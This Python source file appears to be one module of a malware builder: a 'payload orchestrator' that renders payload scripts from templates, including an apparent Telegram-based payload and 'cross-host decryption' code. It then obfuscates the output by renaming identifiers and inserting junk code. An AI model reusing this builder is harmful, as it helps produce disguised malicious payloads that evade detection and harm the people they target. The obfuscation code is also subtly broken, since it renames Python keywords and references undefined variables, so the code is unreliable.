# core/orchestrator.py
"""
Payload Orchestrator - Updated with cross-host support
"""

import logging
from typing import Dict, Any, List
from pathlib import Path
from jinja2 import Environment, FileSystemLoader, Template
import os


class PayloadOrchestrator:
    """
    Orchestrates payload generation with cross-host decryption support.
    """

    def __init__(self, template_dir: str = "payload/templates"):
        self.logger = logging.getLogger(__name__)
        self.template_loader = FileSystemLoader(template_dir)
        self.env = Environment(
            loader=self.template_loader,
            trim_blocks=True,
            lstrip_blocks=True,
            keep_trailing_newline=True,
        )

    def generate(self, context: Dict[str, Any]) -> str:
        """
        Generate the final payload script.
        Includes cross-host decryption code when enabled.
        """
        self.logger.info("Generating payload with context keys: %s", context.keys())

        # Determine payload type
        payload_type = context.get("payload_type", "full")
        cross_host_enabled = context.get("cross_host", False)

        # Get base template
        if cross_host_enabled:
            template = self.env.get_template("telegram_payload.py.j2")
        else:
            template = self.env.get_template("base.py.j2")

        # Prepare modules
        modules = context.get("modules", [])
        module_templates = []
        for module in modules:
            template_content = module.get("template", "")
            if template_content:
                module_templates.append(template_content)

        # Add cross_host.py content if enabled
        cross_host_code = ""
        if cross_host_enabled:
            cross_host_path = Path(__file__).parent / "cross_host.py"
            if cross_host_path.exists():
                with open(cross_host_path, "r") as f:
                    cross_host_code = f.read()

        context["module_templates"] = "\n".join(module_templates)
        context["cross_host_code"] = cross_host_code

        # Render
        rendered = template.render(**context)

        # Apply obfuscation
        obfuscation_level = context.get("obfuscation_level", "medium")
        if obfuscation_level != "none":
            rendered = self._apply_obfuscation(rendered, obfuscation_level)

        return rendered

    def _apply_obfuscation(self, code: str, level: str) -> str:
        """Apply code obfuscation."""
        if level == "low":
            return self._obfuscate_low(code)
        elif level == "medium":
            return self._obfuscate_medium(code)
        elif level == "high":
            return self._obfuscate_high(code)
        return code

    def _obfuscate_low(self, code: str) -> str:
        import re
        import secrets
        var_map = {}
        def replace_var(match):
            var = match.group(1)
            if var not in var_map:
                var_map[var] = secrets.token_hex(8)
            return var_map[var]
        code = re.sub(r'\b([a-zA-Z_][a-zA-Z0-9_]*)\b', replace_var, code)
        return code

    def _obfuscate_medium(self, code: str) -> str:
        code = self._obfuscate_low(code)
        # Add junk code
        import secrets
        junk = f"""
# Junk code
_{secrets.token_hex(4)} = lambda x: x + {secrets.randbelow(100)}
if _{secrets.token_hex(4)}:
    pass
"""
        lines = code.split("\n")
        for i in range(1, len(lines), 5):
            lines.insert(i, junk)
        return "\n".join(lines)

    def _obfuscate_high(self, code: str) -> str:
        return self._obfuscate_medium(code) + "\n# Advanced obfuscation applied"
